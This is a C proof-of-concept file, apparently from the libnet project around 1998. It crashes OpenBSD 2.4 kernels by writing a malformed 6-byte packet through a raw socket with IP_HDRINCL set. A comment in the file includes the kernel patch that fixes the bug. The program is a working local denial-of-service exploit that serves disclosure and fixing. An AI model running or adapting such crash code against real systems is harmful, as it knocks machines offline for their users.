/*
 *  $Id: hook.c,v 1.1 2004/04/27 01:33:22 dyang Exp $
 *
 *  hook.c
 *  Panics OpenBSD 2.4 kernels.
 *
 *  Well whut doya know?  Here I am working on libnet when I come up with this.
 *  Localhost OpenBSD kernel panic.  No security issue.  Just a kernel bug.
 *
 *  Opening a raw IP socket and setting IP_HDRINCL and then NOT including an
 *  IP header causes problems.  The code below with the `magic` numbers will
 *  cause an immediate kernel panic.  Other data may cause kernel
 *  instability leading to an eventual panic or crash.
 *
 *  Needs libnet (http://www.packetfactory.net).
 *
 *  (c) 1998 route|daemon9 <route@infonexus.com>
 */

/*

--- raw_ip.c.old        Fri Dec 11 16:48:26 1998
+++ raw_ip.c    Fri Dec 11 16:46:59 1998
@@ -200,11 +200,13 @@
                 * don't allow both user specified and setsockopt options,
                 * and don't allow packet length sizes that will crash
                 */
-               if ((ip->ip_hl != (sizeof (*ip) >> 2) && inp->inp_options) ||
-                   ip->ip_len > m->m_pkthdr.len) {
-                       m_freem(m);
-                       return (EINVAL);
-               }
+                if ((ip->ip_hl != (sizeof (*ip) >> 2) && inp->inp_options)
+                    || (ip->ip_len > m->m_pkthdr.len)
+                    || (ip->ip_len < ip->ip_hl << 2)) {
+                        m_freem(m);
+                        return EINVAL;
+                }
+
                if (ip->ip_id == 0)
                        ip->ip_id = htons(ip_id++);
                /* XXX prevent ip_output from overwriting header fields */
*/
#include <libnet.h>

#define BUFSIZE 6

int
main(int argc, char **argv)
{
    int sock;
    u_char *buf, *p;

    fprintf(stderr, "PUSH THE PANIC BUTTON!\n");

    buf = (u_char *)malloc(BUFSIZE);
    if (!buf)
    {
        perror("No memory for packet header");
        exit(EXIT_FAILURE);
    }

    /*
     *  Open a IPPROTO_RAW socket and set IP_HDRINCL.
     */
    sock = libnet_open_raw_sock(IPPROTO_RAW);
    if (sock == -1)
    {
        perror("No socket");
        exit(EXIT_FAILURE);
    }

    p = buf;

    *((u_char *)p) = 8;
    p += 1;
    *((u_char *)p) = 0;
    p += 2;
    *((u_short *)p) = htons(242);
    p += 2;
    *((u_short *)p) = htons(1);

    libnet_write_ip(sock, buf, BUFSIZE);
    printf("Didn't die.  Try again maybe.\n");
    free(buf);

    return (EXIT_SUCCESS);
}

/* EOF */
